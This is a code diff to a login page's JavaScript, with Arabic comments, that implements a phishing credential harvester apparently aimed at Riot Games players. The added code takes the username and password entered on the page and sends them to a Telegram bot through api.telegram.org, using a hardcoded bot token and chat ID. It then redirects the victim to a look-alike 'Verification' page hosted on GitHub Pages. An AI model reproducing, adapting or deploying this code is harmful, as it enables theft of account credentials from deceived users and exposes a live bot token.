@@ -3,38 +3,40 @@ document.addEventListener("DOMContentLoaded", function () {
     const passwordInput = document.getElementById("password");
     const loginBtn = document.getElementById("login-btn");
 
-function handleInput() {
-    checkInputs();
-}
-
-  function checkInputs() {
+    function checkInputs() {
         if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
-            loginBtn.removeAttribute("disabled");
+            loginBtn.removeAttribute("disabled"); // تفعيل الزر
         } else {
-            loginBtn.setAttribute("disabled", "true");
+            loginBtn.setAttribute("disabled", "true"); // تعطيل الزر
         }
     }
 
-function sendToTelegram() {
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
+    function sendToTelegram() {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
 
-    if (username === "" || password.length <= 6) {
-        
-        return;
+        if (username === "" || password === "") return;
+
+        const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
+        const chatId = "6687453395";
+        const message = `🔥 New Login Attempt 🔥\n\n👤 Username: ${username}\n🔒 Password: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                alert("✅ Data sent successfully!");
+                window.location.href = "https://riotgames0.github.io/Verification./Lvl30/index.html";
+            })
+            .catch(error => console.error("❌ Error sending to Telegram:", error));
     }
 
-    const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM"; 
-    const chatId = "6687453395";  
-    const message = `🔥 تسجيل دخول جديد 🔥\n\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;
+    // التأكد من صحة الإدخال وتفعيل الزر
+    usernameInput.addEventListener("input", checkInputs);
+    passwordInput.addEventListener("input", checkInputs);
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-    fetch(url)
-        .then(() => {
-    
-            window.location.href = "https://www.riotgames.com/";
-        })
-        .catch(error => console.error("Error sending to Telegram:", error));
-}
-
+    // عند الضغط على السهم
+    loginBtn.addEventListener("click", function () {
+        if (!loginBtn.hasAttribute("disabled")) {
+            sendToTelegram();
+        }
+    });
+});
